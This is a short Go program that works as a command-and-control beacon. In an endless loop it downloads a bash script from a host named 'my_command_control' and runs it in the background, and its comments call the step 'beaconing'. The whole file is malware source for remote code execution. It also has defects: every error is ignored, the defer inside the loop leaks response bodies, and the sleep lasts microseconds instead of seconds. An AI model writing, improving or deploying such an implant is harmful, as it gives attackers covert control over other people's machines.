package main

import (
	"io"
	"net/http"
	"os/exec"
	"time"
)

func main() {
	for {
		url := "http://my_command_control:8080/executeThisScript" // Download your bash script
		resp, _ := http.Get(string(url))

		defer resp.Body.Close()

		shellScriptBody, _ := io.ReadAll(resp.Body) // keep in memory

		cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
		cmd.Start() // run in background

		time.Sleep(5000) // wait for the next beacoming
	}
}
